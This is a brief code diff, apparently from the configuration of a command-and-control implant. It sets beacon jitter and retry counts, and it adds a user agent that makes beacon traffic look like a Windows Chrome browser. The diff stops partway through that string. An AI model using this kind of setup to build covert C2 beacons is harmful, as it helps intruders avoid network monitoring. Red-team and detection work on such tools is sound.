@@ -15,4 +15,5 @@ var Jitter = 5
 // Retries is the amount of tries to keep trying in case C2 is unreachable
 var Retries = 3
 
-// UserAgent is user agent that
+// UserAgent is user agent that gets sent on beacons
+var UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.
